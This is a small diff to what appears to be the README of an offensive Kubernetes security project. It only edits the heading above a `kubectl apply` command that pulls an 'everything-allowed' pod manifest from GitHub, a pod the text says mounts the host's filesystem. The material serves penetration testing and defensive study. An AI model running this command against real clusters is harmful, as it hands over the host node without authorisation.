@@ -8,7 +8,7 @@ The pod you create mounts the host’s filesystem to the pod. You’ll have the 
 # Pod Creation
 
 ## Create a pod you can exec into
-Create pod from github hosted yaml
+Create pod
 ```bash
 kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/everything-allowed.yaml 
 ```
